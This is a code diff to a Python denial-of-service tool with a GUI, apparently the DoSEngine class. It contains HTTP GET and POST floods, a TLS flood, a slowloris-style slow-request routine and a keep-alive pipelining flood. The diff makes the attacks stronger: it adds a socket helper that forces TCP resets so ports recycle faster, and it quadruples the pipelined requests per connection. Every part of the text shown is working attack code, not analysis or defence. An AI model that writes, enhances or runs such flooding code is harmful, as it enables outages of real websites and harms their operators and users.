@@ -12,6 +12,7 @@ import random
 import time
 import os
 import queue
+import struct
 import tkinter as tk
 from tkinter import scrolledtext, Entry, Button, Label, StringVar, IntVar, OptionMenu
 from datetime import datetime
@@ -46,6 +47,17 @@ class DoSEngine:
         except socket.gaierror:
             self.target_ip = target
 
+    def _create_sock(self, timeout=4):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # SO_LINGER (1, 0) sends TCP RST on close to bypass TIME_WAIT and recycle ephemeral port immediately
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+        except Exception:
+            pass
+        return s
+
     def _inc(self, req=1, bytes_=0, err=False):
         with self.lock:
             self.requests_sent += req
@@ -57,8 +69,7 @@ class DoSEngine:
     def http_get(self):
         while not self.stop_flag:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(3)
+                s = self._create_sock(3)
                 s.connect((self.target_ip, self.port))
                 path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
                 req = (
@@ -82,8 +93,7 @@ class DoSEngine:
     def http_post(self):
         while not self.stop_flag:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(3)
+                s = self._create_sock(3)
                 s.connect((self.target_ip, self.port))
                 body = os.urandom(random.randint(256, 2048))
                 req = (
@@ -107,8 +117,7 @@ class DoSEngine:
         ctx.verify_mode = ssl.CERT_NONE
         while not self.stop_flag:
             try:
-                raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                raw.settimeout(4)
+                raw = self._create_sock(4)
                 raw.connect((self.target_ip, self.port))
                 s = ctx.wrap_socket(raw, server_hostname=self.target)
                 req = (
@@ -129,8 +138,7 @@ class DoSEngine:
         sock_list = []
         while not self.stop_flag:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
+                s = self._create_sock(4)
                 s.connect((self.target_ip, self.port))
                 s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                 s.send(f"Host: {self.target}\r\n".encode())
@@ -151,15 +159,14 @@ class DoSEngine:
     def keepalive_flood(self):
         while not self.stop_flag:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
+                s = self._create_sock(5)
                 s.connect((self.target_ip, self.port))
                 s.send(
                     f"HEAD / HTTP/1.1\r\nHost: {self.target}\r\n"
                     f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                     f"Connection: keep-alive\r\n\r\n".encode()
                 )
-                for _ in range(50):
+                for _ in range(200):
                     if self.stop_flag:
                         break
                     s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {self.target}\r\n\r\n".encode())
